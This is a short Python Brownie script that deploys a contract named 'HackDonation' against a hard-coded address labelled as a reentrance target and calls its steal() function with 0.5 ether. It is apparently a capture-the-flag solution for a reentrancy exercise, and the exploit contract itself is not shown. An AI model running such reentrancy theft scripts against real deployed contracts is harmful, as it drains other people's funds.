from brownie import accounts, chain, web3, HackDonation
import brownie
import pytest


def main():
    address_reentrance = '0xfb9fbdD3b628dBC874Cb5C1868A9A9f91AD70Bcb'
    caller = accounts.load('accountDeploy01')
    hack_donation = caller.deploy(
        HackDonation,
        address_reentrance,
        publish_source=True
    )
    hack_donation.steal({"from": caller, "value": 500000000000000000})
